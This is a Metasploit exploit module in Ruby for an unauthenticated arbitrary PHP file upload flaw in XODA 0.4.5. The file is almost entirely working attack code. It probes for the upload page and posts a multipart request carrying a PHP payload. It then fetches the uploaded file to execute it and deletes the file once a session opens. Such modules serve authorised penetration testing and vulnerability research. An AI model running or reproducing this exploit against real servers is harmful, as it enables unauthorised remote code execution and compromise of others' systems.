##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "XODA 0.4.5 Arbitrary PHP File Upload Vulnerability",
			'Description'    => %q{
					This module exploits a file upload vulnerability found in XODA 0.4.5. Attackers
				can abuse the "upload" command in order to upload a malicious PHP file without any
				authentication, which results in arbitrary code execution. The module has been
				tested successfully on XODA 0.4.5 and Ubuntu 10.04.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Shai rod', # Vulnerability Discovery and PoC
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'EDB', '20703' ]
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Targets'        =>
				[
					['XODA 0.4.5', {}],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Aug 21 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [ true, "The base path to the web application", "/xoda/"])
			], self.class)
	end


	def check
		uri = target_uri.path
		uri << '/' if uri[-1,1] != '/'

		res = send_request_raw({
			'method' => 'GET',
			'uri'    => "#{uri}?upload_to="
		})

		if res and res.code == 200 and res.body =~ /Upload a file/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end

	def on_new_session(client)
		if client.type == "meterpreter"
			client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
			client.fs.file.rm(@payload_name)
		else
			client.shell_command_token(@payload_name)
		end
	end

	def exploit
		uri = target_uri.path
		uri << '/' if uri[-1,1] != '/'

		peer = "#{rhost}:#{rport}"
		@payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + '.php'

		boundary = "---------------------------#{Rex::Text.rand_text_numeric(27)}"

		post_data = "--#{boundary}\r\n"
		post_data << "Content-Disposition: form-data; name=\"files_to_upload[]\"; filename=\"#{@payload_name}\"\r\n\r\n"
		post_data << "<?php "
		post_data << payload.encoded
		post_data << " ?>\r\n"
		post_data << "--#{boundary}\r\n"
		post_data << "Content-Disposition: form-data; name=\"pwd\"\r\n\r\n"
		post_data << "\r\n"
		post_data << "--#{boundary}--\r\n"

		print_status("#{peer} - Sending PHP payload (#{@payload_name})")
		res = send_request_cgi({
			'method' => 'POST',
			'uri'    => "#{uri}?upload",
			'ctype'  => "multipart/form-data; boundary=#{boundary}",
			'data'   => post_data
		})

		if not res or res.code != 302
			print_error("#{peer} - File wasn't uploaded, aborting!")
			return
		end

		print_status("#{peer} - Executing PHP payload (#{@payload_name})")

		# Execute our payload
		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => "#{uri}files/#{@payload_name}"
		})

		# If we don't get a 200 when we request our malicious payload, we suspect
		# we don't have a shell, either.  Print the status code for debugging purposes.
		if res and res.code != 200
			print_status("#{peer} - Server returned #{res.code.to_s}")
		end
	end

end
